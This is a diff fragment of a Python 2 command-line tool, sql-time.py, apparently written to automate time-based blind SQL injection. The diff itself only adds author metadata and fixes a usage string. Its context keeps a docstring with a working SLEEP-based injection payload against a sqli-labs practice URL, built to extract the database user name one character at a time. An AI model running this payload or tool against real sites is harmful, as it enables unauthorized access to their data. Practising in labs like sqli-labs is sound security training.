@@ -4,13 +4,17 @@ import time
 import requests
 import sys
 
+__author__ = "whois"
+__date__   = "2016/10/1"
+
 """ 
     http://10.10.10.100/sqli-labs/Less-8/?id=1'+and+if(now()=sysdate(),SLEEP(IF(ascii(mid(user(),1,1))=116,10,0)),0)
     http://xxx.com/1.php?id=if()...
 """
+
 if len(sys.argv) < 2:
     print "Usage: sql-time target time(default 6)"
-    print "ex: sql-time.py http://xxx.com/1.php?id=  5"
+    print "ex: sql-time.py http://xxx.com/1.php?id=5"
     exit(1)
 
 my_time = int(sys.argv[2]) if len(sys.argv)==3 else 6
